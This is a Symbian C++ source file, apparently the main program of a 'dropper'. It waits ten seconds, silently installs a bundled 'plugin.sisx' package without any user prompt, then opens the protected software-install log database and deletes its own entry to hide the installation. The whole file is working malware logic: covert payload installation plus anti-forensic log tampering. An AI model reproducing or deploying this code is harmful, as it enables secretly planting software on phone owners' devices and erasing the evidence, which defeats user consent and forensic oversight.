/*
 ============================================================================
 Name		: Uninstaller.cpp
 Author	  : 
 Copyright   : 
 Description : Exe source file
 ============================================================================
 */

//  Include Files  

#include "Dropper.h"
#include <e32base.h>
#include <e32std.h>
#include <e32cons.h>			// Console
#include <swinstapi.h>			// Uninstaller
#include <swinstdefs.h>
#include <d32dbms.h>
#include <aknutils.h>
#include <f32file.h>

#include "Keys.h"

//  Local Functions

LOCAL_C void DeleteInstallerLog(TUid aUid)
	{
	_LIT( KLogSecureFormat, "SECURE%S" );   // found  in LogTask.cpp
	#define KSWInstLogAccessPolicyUid 0x10207216  // found in SWInstUid.h
	// UID of the SWInstLog db access policy, found in SWInstLogTaskParam.h
	const TUid KLogAccessPolicyUid = { KSWInstLogAccessPolicyUid }; 
	// Name of the install log db, found in SWInstLogTaskParam.h 
	_LIT( KLogDatabaseName, "c:SWInstLog.db" );  
	// Name of the log table, found in SWInstLogTaskParam.h
	_LIT( KLogTableName, "log" );

	TInt err;
	RDbs dbSession;
	err = dbSession.Connect();
	if(err != KErrNone)
		return;
	CleanupClosePushL(dbSession);
	// Construct the db format string
	TBuf<32> formatString;
	TUidName uidStr = KLogAccessPolicyUid.Name();    
	formatString.Format( KLogSecureFormat, &uidStr );
		
	RDbNamedDatabase dbs;
	// Try to open the db
	err = dbs.Open( dbSession, KLogDatabaseName, formatString );
	if(err != KErrNone)
		{
		// can't open db, return
		CleanupStack::PopAndDestroy(&dbSession);
		return;
		}
	CleanupClosePushL( dbs );
					
	// See if the log table already exists
	RDbTable table;
	err = table.Open( dbs, KLogTableName);
	if ( err != KErrNone )
		{
		// Table does not exist
		CleanupStack::PopAndDestroy(2); //dbs, dbsession
		return;
		}
	CleanupClosePushL( table );        
	
	// delete entry
	_LIT( KLogDeleteSQLFormat,"DELETE FROM log WHERE uid=%u"); 
	TBuf<64> sqlString;
	sqlString.Format(KLogDeleteSQLFormat,aUid.iUid);
	dbs.Execute(sqlString);
	dbs.Compact();
	CleanupStack::PopAndDestroy(3); //table, dbs, dbsession       
	}

LOCAL_C void MainL()
	{
	// install log table has been defined into Symbian source code as:
	/*
	// SQL query to create the log table
	_LIT( KLogCreateTableSQL, 
	"CREATE TABLE log (time BIGINT NOT NULL,uid UNSIGNED INTEGER NOT NULL,\
	name VARCHAR(128) NOT NULL,vendor VARCHAR(128) NOT NULL,\
	version VARCHAR(16) NOT NULL,action UNSIGNED INTEGER,startup UNSIGNED INTEGER)" );
	*/

	User::After(10*1000000);
	
	// Prepare for silent install
	SwiUI::RSWInstSilentLauncher      launcher; 
	SwiUI::TInstallOptions            options;
	SwiUI::TInstallOptionsPckg        optionsPckg;	
		
	// Connect to the server
	User::LeaveIfError( launcher.Connect() );
		  
	// See SWInstDefs.h for more info about these options
	options.iUpgrade = SwiUI::EPolicyAllowed;
	options.iOCSP = SwiUI::EPolicyNotAllowed;
	options.iDrive = 'C';   // Hard-coded as phone memory  
	options.iUntrusted = SwiUI::EPolicyNotAllowed; 
	options.iCapabilities = SwiUI::EPolicyAllowed;
		    
	optionsPckg = options;
		
	// Create path
	TFileName path;
	RFs fs;
	fs.Connect();
	fs.PrivatePath( path );
	fs.Close();
	path.Append(_L("plugin.sisx"));
	
	TFileName processName = RProcess().FileName();
	TParse parse;
	parse.Set(processName , NULL, NULL);
	path.Insert(0,parse.Drive()); 
	
	// Start synchronous install
	TInt err = KErrNone;
	err = launcher.SilentInstall(path,optionsPckg);
			
	launcher.Close();

	// Delete install log of dropper install
	TBuf8<12> hexBuf(KUidUninstaller);
	hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
	TLex8 lex(hexBuf);
	lex.Assign(hexBuf);
	TUint32 uninstUid;
	lex.Val(uninstUid,EHex);
	TUid uninstallerUid = TUid::Uid(uninstUid);
	DeleteInstallerLog(uninstallerUid);
		
	}


LOCAL_C void DoStartL()
	{
	// Create active scheduler (to run active objects)
	CActiveScheduler* scheduler = new (ELeave) CActiveScheduler();
	CleanupStack::PushL(scheduler);
	CActiveScheduler::Install(scheduler);

	MainL();

	// Delete active scheduler
	CleanupStack::PopAndDestroy(scheduler);
	
	}

//  Global Functions

GLDEF_C TInt E32Main()
	{
	// Create cleanup stack
	__UHEAP_MARK;
	CTrapCleanup* cleanup = CTrapCleanup::New();
	
	// Run application code inside TRAP harness, wait keypress when terminated
	TRAPD(mainError, DoStartL());

	delete cleanup;
	__UHEAP_MARKEND;
	return mainError;
	}

